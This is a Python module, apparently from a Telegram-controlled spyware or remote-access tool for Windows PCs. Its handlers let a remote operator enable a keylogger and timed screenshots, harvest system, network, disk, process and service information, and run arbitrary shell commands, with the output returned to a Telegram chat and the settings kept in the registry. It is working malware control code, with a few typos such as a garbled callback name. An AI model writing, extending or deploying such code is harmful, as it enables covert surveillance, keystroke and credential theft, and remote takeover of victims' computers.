import os
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from lib.winregistry import WinRegistry
import telebot
from lib.pathreg import *
from lib.explorerfile import ExplorerFiles
from lib.util import Util
from lib.pcinformation import PCInformation


def message_success(command, id):
    print("[success command] [OK]=> {command} from id:[{id}]".format(status=status, command=command, id=id))


def message_error(command, id):
    print("[success command] [ERROR]=> [{command}] from id:[{id}]".format(status=status, command=command, id=id))


async def start(bot, id, message):
    menu = "Command List\n\n" \
           "/status \n" \
           "/keylogger <menu>\n" \
           "/screenshot <menu>\n" \
           "/information\n"
        # await bot.delete_message(id, message.id)
    message_success("config|help|start|.|command", id)
    await bot.send_message(id, menu)


async def change_id(bot, id, message):
    new_id = Util().last_command(message.text)
    await bot.send_message(new_id,
                           'Se envio un mensaje de confirmacion en el nuevo grupo o usuario [acepte o deniegue el cambio del ID]')
    try:
        await bot.send_message(new_id, 'Este mensaje debe llegar al nuevo grupo o usuario')
        markup = InlineKeyboardMarkup()
        markup.row_width = 2
        markup.add(InlineKeyboardButton("Accept Change ID", callback_data="change_id_agree"),
                   InlineKeyboardButton("No accept Chaange ID", callback_data="change_id_reject"),
                   )
        WinRegistry(REG_TELEGRAM).set_value_String('id_temp', new_id)
        await bot.send_message(new_id, "Estás seguro que deseas cambiar el ID actual por *" + new_id + "*",
                               reply_markup=markup, parse_mode='markdown')
    except:
        await bot.send_message(id, 'Hubo un error con el nuevo ID: [' + new_id + '] verifique si está bien escrita'
                                                                                 '\n Debe llegar un mensaje de confirmacion en el nuevo grupo o usuario\n '
                                                                                 'Solo se cambiará el id del registro ')


async def status(bot, id, message):
    print('[success command] [OK]=> "status" from id:[' + id + ']')
    await bot.send_message(id, "This PC *|" + USERNAME + "|* is active", parse_mode='markdown')


async def config_keylogger(bot, id, message):
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Enable", callback_data="keylogger_active"),
               InlineKeyboardButton("Disable", callback_data="keylogger_disable"),
               InlineKeyboardButton("Set limit", callback_data="keylogg888er_limit")
               )
    message_success("config_keylogger", id)
    await bot.send_message(id, "*|Set config keylogger|*", reply_markup=markup, parse_mode='markdown')
    # await bot.delete_message(id, message.id)


async def screenshot_show_menu(bot, id):
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Enable", callback_data="screenshot_active"),
               InlineKeyboardButton("Disable", callback_data="screenshot_disable"),
               InlineKeyboardButton("Set interval", callback_data="screenshot_interval")
               )
    await bot.send_message(id, "*|Config Screenshot|*", reply_markup=markup, parse_mode='markdown')


async def keylogger_show_menu(bot, id):
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Enable", callback_data="keylogger_active"),
               InlineKeyboardButton("Disable", callback_data="keylogger_disable"),
               InlineKeyboardButton("Set limit", callback_data="keylogger_limit")
               )

    await bot.send_message(id, "*|Set config keylogger|*", reply_markup=markup, parse_mode='markdown')


async def information_menu(bot, id):
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Get DNS Information", callback_data="information_dns"),
               InlineKeyboardButton("Get RED information", callback_data="information_red"),
               InlineKeyboardButton("Get List Hard Disk", callback_data="list_hard_disk"),
               InlineKeyboardButton("Get information IP", callback_data="information_ip"),
               InlineKeyboardButton("Get System information", callback_data="information_sys"),
               InlineKeyboardButton("Get driver information", callback_data="information_driver"),
               InlineKeyboardButton("Get programs running ", callback_data="information_current_software"),
               InlineKeyboardButton("Get services running", callback_data="information_current_services")
               )
    await bot.send_message(id, "*|Get information|*", reply_markup=markup, parse_mode='markdown')
    # await bot.delete_message(id, message.id)


async def cmd(bot, id, message):
    last_command = Util().last_command(message.text)

    await bot.send_chat_action(id, 'typing')

    c = PCInformation().CMD_command(last_command, last_command)
    for data in Util().split_string(3000, c):
        await bot.send_message(id, data)
    await bot.send_message(id, '|>>> Finish CMD Command *' + last_command + '* <<<|', parse_mode='markdown')


async def keylogger_settime(bot, id, call, limit_key):
    try:
        WinRegistry(REG_KEYLOGGER).set_value_DWORD('limit', int(limit_key))
    except:
        await bot.answer_callback_query(call.id, "[Keylogger] Failed set interval seconds")
    else:
        await bot.answer_callback_query(call.id, "[Keylogger] ew time  interval is " + limit_key + " |OK|")
    finally:
        await bot.delete_message(id, call.message.id)


async def screenshot_setinterval(bot, id, call, limit_key):
    try:
        WinRegistry(REG_SCREENSHOT).set_value_DWORD('interval_seconds', int(limit_key))
    except:
        await bot.answer_callback_query(call.id, "[Screenshot] Failed set interval seconds")
    else:
        await bot.answer_callback_query(call.id, "[Screenshot] New time  interval is " + limit_key + " seconds |OK|")
    finally:
        await bot.delete_message(id, call.message.id)


async def change_token_bot(bot, id):

    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Yes, Agree update Registry", callback_data="json_update_agree"),
               InlineKeyboardButton("No", callback_data="json_update_reject")
               )
    await bot.send_message(id, "*|Accept Update Data from Regedit with Json API? |*", reply_markup=markup, parse_mode='markdown')


async def callback_query_others(bot, id, call):
    limit_key = call.data[1:len(call.data)]
    if call.data[0:1] == 'k':
        await keylogger_settime(bot, id, call, limit_key)
    elif call.data[0:1] == 's':
        await screenshot_setinterval(bot, id, call, limit_key)
